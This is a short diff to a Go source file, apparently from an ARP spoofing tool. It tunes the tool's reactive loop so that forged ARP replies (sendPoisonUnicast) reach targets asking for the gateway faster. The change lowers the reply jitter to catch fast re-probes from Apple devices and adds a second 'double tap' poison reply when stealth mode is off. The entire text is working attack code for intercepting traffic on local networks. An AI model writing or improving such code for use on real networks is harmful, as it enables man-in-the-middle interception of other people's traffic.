@@ -99,13 +99,19 @@ func (s *Spoofer) reactiveLoop() {
 			reqIP := net.IP(arp.DstProtAddress)
 			srcIP := net.IP(arp.SourceProtAddress)
 
-			// Jitter delay for stealth
-			time.Sleep(time.Duration(10+_randInt(20)) * time.Millisecond)
+			// AGILITY: Lower jitter for fast re-probes (Apple NUD)
+			time.Sleep(time.Duration(2+_randInt(8)) * time.Millisecond)
 
 			if reqIP.Equal(s.GatewayIP) {
 				if t := s.Session.GetTargetByIP(srcIP); t != nil {
 					// REPLY TO REQUESTER (Unicast eth)
 					s.sendPoisonUnicast(t.IP, t.MAC, s.GatewayIP, s.MyMAC, arp.SourceHwAddress)
+					
+					// Double tap for higher success
+					if !s.Stealth {
+						time.Sleep(1 * time.Millisecond)
+						s.sendPoisonUnicast(t.IP, t.MAC, s.GatewayIP, s.MyMAC, arp.SourceHwAddress)
+					}
 				}
 			}
 			if t := s.Session.GetTargetByIP(reqIP); t != nil {
